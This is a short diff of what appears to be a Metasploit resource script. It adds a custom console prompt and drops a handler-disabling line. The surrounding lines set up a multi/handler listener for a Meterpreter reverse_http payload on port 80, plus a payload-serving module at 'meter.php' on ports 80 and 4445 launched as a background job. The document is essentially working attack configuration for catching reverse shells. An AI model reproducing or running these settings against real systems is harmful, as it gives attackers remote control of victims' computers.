@@ -1,3 +1,5 @@
+setg prompt [%T] %L (s:%S j:%J)
+
 use exploit/multi/handler
 set PAYLOAD multi/meterpreter/reverse_http
 set LPORT 80
@@ -27,5 +29,3 @@ set URIPATH meter.php
 set SRVPORT 80
 set LPORT 4445
 exploit -j
-
-set -g DisablePayloadHandler true
